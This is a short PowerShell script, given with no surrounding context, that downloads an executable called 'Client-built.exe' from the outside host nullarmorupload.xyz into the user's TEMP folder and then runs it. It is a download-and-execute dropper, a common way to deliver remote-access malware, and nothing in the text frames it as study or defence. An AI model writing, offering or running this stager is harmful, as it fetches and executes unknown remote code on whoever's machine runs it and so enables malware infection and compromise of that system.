# Define URL of the file
$url = "http://nullarmorupload.xyz/download/b3a2d28f"

# Define local path to save the executable
$localPath = "$env:TEMP\Client-built.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $localPath

# Run the downloaded EXE
Start-Process -FilePath $localPath -Wait
